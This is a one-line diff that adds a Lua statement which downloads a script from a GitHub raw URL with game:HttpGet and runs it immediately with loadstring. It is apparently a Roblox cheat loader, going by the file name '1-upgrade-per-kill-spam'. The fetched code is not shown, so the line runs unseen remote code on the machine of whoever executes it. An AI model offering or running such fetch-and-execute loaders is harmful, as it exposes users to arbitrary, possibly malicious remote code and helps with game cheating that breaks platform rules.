@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LengthRescuer49/loaders/main/loaders/1-upgrade-per-kill-spam7-2csvnbvuol9rdk.lua"))()
